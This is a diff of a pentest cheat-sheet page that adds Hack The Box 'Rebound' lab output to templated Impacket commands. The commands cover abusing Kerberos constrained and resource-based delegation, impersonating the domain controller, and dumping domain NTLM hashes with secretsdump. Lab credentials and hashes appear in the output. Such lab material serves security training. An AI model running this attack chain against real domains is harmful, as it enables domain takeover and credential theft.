@@ -336,26 +336,102 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-find-delegation">1. Find delegation</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check delegation
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-findDelegation &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -dc-ip &lt;DC&gt; -hashes :&lt;HASH&gt; -k
-</span></span></span></code></pre></div><h4 id="2-get-a-service-ticket">2. Get a service ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-getST -spn &lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt; -impersonate administrator &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -hashes :&lt;HASH&gt; -self
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check forwardable flag
-</span></span><span class="line"><span class="cl"><span class="go">describeTicket.py &lt;TICKET_1&gt;.ccache
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-findDelegation &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -dc-ip &lt;DC&gt; -hashes :&lt;HASH&gt; -k -no-pass
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> impacket-findDelegation <span class="s1">&#39;rebound.htb/delegator$&#39;</span> -dc-ip dc01.rebound.htb -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -no-pass
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting machine hostname
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Getting machine hostname
+</span></span></span><span class="line"><span class="cl"><span class="go">AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists 
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------  -----------------------------------  --------------  ---------------------  ----------
+</span></span></span><span class="line"><span class="cl"><span class="go">delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No
 </span></span></span></code></pre></div><h4 id="3-rbcd-attack">3. RBCD Attack</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add delegation
-</span></span><span class="line"><span class="cl"><span class="go">impacket-rbcd &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -hashes :&lt;HASH&gt; -k -delegate-from &lt;USER&gt; -delegate-to &lt;TARGET_1&gt; -action write -dc-ip &lt;DC&gt; -use-ldaps
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-rbcd &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -hashes :&lt;HASH&gt; -k -delegate-from &#39;&lt;TARGET_1&gt;&#39; -delegate-to &#39;&lt;USER&gt;&#39; -action write -dc-ip &lt;DC&gt; -use-ldaps
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> impacket-rbcd <span class="s1">&#39;rebound.htb/delegator$&#39;</span> -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -delegate-from <span class="s1">&#39;ldap_monitor&#39;</span> -delegate-to <span class="s1">&#39;delegator$&#39;</span> -action write -dc-ip dc01.rebound.htb -use-ldaps
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Delegation rights modified successfully!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Accounts allowed to act on behalf of other identity:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-findDelegation &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -dc-ip &lt;DC&gt; -hashes :&lt;HASH&gt; -k
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-findDelegation &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -dc-ip &lt;DC&gt; -hashes :&lt;HASH&gt; -k -no-pass
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> impacket-findDelegation <span class="s1">&#39;rebound.htb/delegator$&#39;</span> -dc-ip dc01.rebound.htb -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -no-pass                        
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting machine hostname
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">AccountName   AccountType                          DelegationType              DelegationRightsTo    
+</span></span></span><span class="line"><span class="cl"><span class="go">------------  -----------------------------------  --------------------------  ---------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">ldap_monitor  Person                               Resource-Based Constrained  delegator$            
+</span></span></span><span class="line"><span class="cl"><span class="go">delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb
 </span></span></span></code></pre></div><h4 id="4-get-a-service-ticket">4. Get a service ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Impersonate
-</span></span><span class="line"><span class="cl"><span class="go">impacket-getST &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -spn &lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt; -impersonate &lt;TARGET_2&gt;
+</span></span><span class="line"><span class="cl"><span class="go">impacket-getST &#39;&lt;DOMAIN&gt;/&lt;TARGET_1&gt;:&lt;TARGET_1_PASSWORD&gt;&#39; -spn &lt;SERVICE_1&gt;/&lt;TARGET_DOMAIN&gt; -impersonate &#39;&lt;TARGET_2&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-getST <span class="s1">&#39;rebound.htb/ldap_monitor:1GR8t@$$4u&#39;</span> -spn browser/dc01.rebound.htb -impersonate <span class="s1">&#39;DC01$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Getting TGT for user
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Impersonating DC01$
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2self
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check forwardable flag
-</span></span><span class="line"><span class="cl"><span class="go">describeTicket.py &lt;TICKET_2&gt;.ccache
+</span></span><span class="line"><span class="cl"><span class="go">describeTicket.py &lt;TICKET_1&gt;.ccache
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-describeTicket <span class="s1">&#39;DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache&#39;</span>                                                                              
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Number of credentials in cache: 1
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Parsing credential[0]:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Ticket Session Key            : a1633e3d4f841386c7845309a671bcbb
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] User Name                     : DC01$
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] User Realm                    : rebound.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Service Name                  : browser/dc01.rebound.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Service Realm                 : REBOUND.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Start Time                    : 23/09/2024 04:58:00 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] End Time                      : 23/09/2024 14:57:58 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] RenewTill                     : 24/09/2024 04:57:56 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] KeyType                       : rc4_hmac
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Base64(key)                   : oWM+PU+EE4bHhFMJpnG8uw==
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$33332d861 ...[SNIP]... 27870efddc
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Decoding unencrypted data in credential[0][&#39;ticket&#39;]:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]   Service Name                : browser/dc01.rebound.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]   Service Realm               : REBOUND.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
 </span></span></span></code></pre></div><h4 id="5-impersonate">5. Impersonate</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-getST -spn &lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt; -impersonate &lt;TARGET_2&gt; &#39;&lt;DOMAIN&gt;/&lt;TARGET_1&gt;&#39; -hashes :&lt;HASH&gt; -additional-ticket &lt;TICKET_2&gt;.ccache
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-getST -spn &lt;SERVICE_2&gt;/&lt;TARGET_DOMAIN&gt; -impersonate &lt;TARGET_2&gt; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -hashes :&lt;HASH&gt; -additional-ticket &lt;TICKET_1&gt;.ccache
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-getST -spn http/dc01.rebound.htb -impersonate DC01$ <span class="s1">&#39;rebound.htb/delegator$&#39;</span> -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -additional-ticket DC01<span class="se">\$</span>@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Getting TGT for user
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Impersonating DC01$
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
 </span></span></span></code></pre></div><h4 id="4-secrets-dump">4. Secrets Dump</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&#39;&lt;TICKET_2&gt;.ccache&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -no-pass -k &lt;DC&gt; -just-dc-ntlm
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -no-pass -k &lt;DC&gt; -just-dc-ntlm
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-ntlm              
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
+</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up..
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
